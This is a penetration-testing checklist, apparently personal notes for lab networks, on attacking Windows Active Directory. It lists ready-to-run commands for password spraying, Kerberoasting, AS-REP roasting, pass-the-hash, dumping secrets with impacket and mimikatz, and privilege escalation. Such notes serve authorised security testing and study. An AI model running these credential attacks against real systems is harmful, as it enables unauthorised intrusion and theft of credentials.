# Penetration Test Checklist



## Unauthenticated Recon - Domain

* [ ] [Create a target list](../../active-directory/password-spraying/creating-a-target-user-list.md)
* [ ] Check for [AS-REPRoastable](../../active-directory/attacking-active-directory-authentication/as-rep-roasting.md) & [Kerberoastable](../../active-directory/attacking-active-directory-authentication/kerberoasting.md) users.&#x20;



***

## Initial Compromise of Network

* [ ] nmap scan of internal network
* [ ] smb shares
* [ ] Check for[ AS-REPRoast](../../active-directory/attacking-active-directory-authentication/as-rep-roasting.md) & [Kerberoastable](../../active-directory/attacking-active-directory-authentication/kerberoasting.md) users.&#x20;

## Windows Privilege Escalation

{% embed url="https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation" %}

***

## Harvested a New Credential&#x20;

<mark style="color:yellow;">**Make sure to test twice**</mark>. Once for domain and once for  "<mark style="color:yellow;">**--local-auth**</mark>" to test local user passwords.

### Spray Passwords

* ```shell-session
  $ hydra -l "yoshi" -p 'Mushroom!' -M ips.txt rdp
  ```
* ```shell-session
  $ netexec smb ips.txt -u users.txt -p passwords.txt 
  ```
* ```shell-session
  $ netexec winrm ips.txt -u users.txt -p passwords.txt
  ```
* <pre class="language-shell-session"><code class="lang-shell-session"><strong>$ netexec wmi ips.txt -u users.txt -p passwords.txt 
  </strong></code></pre>
* <pre class="language-shell-session"><code class="lang-shell-session"><strong>$ netexec mssql ips.txt -u users.txt -p passwords.txt -local-auth
  </strong></code></pre>

### Manual Spray (if above didn't recover anything).

* ```shell-session
  $ proxychains evil-winrm -i 10.10.93.154 -u Administrator -p "Passwords"
  ```
* ```shell-session
  $ proxychains xfreerdp /v:10.10.93.154 /u:Administrator /p:password
  ```



***

## Harvested Domain Credential

### Kerbrute

* ```shell-session
  $ proxychains kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
  ```

### Kerberoast

* ```shell-session
  $ proxychains impacket-GetUserSPNs -request -dc-ip 10.10.113.146 corp.com/web_svc
  ```

### ASREP Roast

* ```shell-session
  $ proxychains impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
  ```

***

## Harvest new Hash

* [ ] Check with crackstation
* ```shell-session
  $ NetExec rdp 192.168.215.175 -u users.txt -H hashes.txt
  ```

***

## Harvested a new Private Key

### Spray Intranet (.ssh)

If we have a shell on a box and notice a user has a private key in their home directory, we should test it against all computers with ssh open.

* ```shell-session
  victim@host$ ssh -i id_rsa mario@172.16.233.14
  ```

***

## Popped a new Shell

### Manual Enumeration

* [ ] [Check **ALL** privileges](../windows-privilege-escalation/escalating-privilege.md#insecure-privileges) "whoami /priv" for potential exploits
* [ ] Check for sensitive files
* [ ] Check for potential binary hijacking
* [ ] Check for scheduled tasks / services running under other users.



### Domain Connected User

#### Check ACL's/ACE's

* [ ] bloodhound / sharphound
* [ ] powerview

### PWNED Shell?- Dump Secrets!

* <pre class="language-shell"><code class="lang-shell"><strong>$ proxychains impacket-secretsdump -hashes ":e728ecbadfb02f51ce8eed753f3ff3fd" celia.almeda@10.10.85.142
  </strong></code></pre>
* <pre class="language-powershell"><code class="lang-powershell"><strong>PS> .\mimikatz.exe
  </strong></code></pre>

***

## Privilege Escalation - Windows

### Automated Enumeration

* <pre class="language-powershell"><code class="lang-powershell"><strong>PS> .\winPEASx64.exe
  </strong></code></pre>
* ```powershell
  PS> powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
  ```

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md" %}

### Manual Enumeration

* ```
  systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Network Card(s)" /C:"Hotfix(s)"
  ```
* ```
  whoami /priv
  ```
* ```
  net user <user>
  ```
* ```
  net localgroup administrators
  ```
* ```
  cmd.exe /c dir /a C:\
  ```
* ```
  ls "program files"
  ```
* ```
  netstat -nao
  ```
* ```
  .\SharpHound -c All --domain medtech.com --zipfilename MEDTECH.zip
  ```

***

## Lateral Movement

* [ ] bloodhound / sharphound (Shortest path to high value targets)
* [ ] mimikatz
* [ ] netexec spray passwords & hashes









## Crying for help?

* [ ] Check [HackerRecipes](https://www.thehacker.recipes/ad/recon)

